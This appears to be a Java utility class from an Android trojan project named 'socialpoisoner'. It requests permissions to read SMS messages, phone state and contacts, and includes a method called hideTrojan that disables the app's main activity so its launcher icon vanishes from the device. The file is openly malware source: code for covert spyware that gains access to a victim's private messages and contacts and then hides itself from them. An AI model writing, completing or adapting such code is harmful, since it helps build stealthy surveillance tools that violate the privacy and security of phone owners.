package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.support.v4.app.ActivityCompat;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Util {

    public static void requestWithout (Activity context) {
        ActivityCompat.requestPermissions(context, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS
        }, 1);
    }

    public static void requestAllPermissions (Activity context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_DENIED
            || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_DENIED) {
                requestWithout (context);
        }
    }

    public static void hideTrojan (Context context) {
        String pgkname = context.getPackageName();
        ComponentName componentToDisable = new ComponentName(pgkname,pgkname+".MainActivity");
        context.getPackageManager().setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}
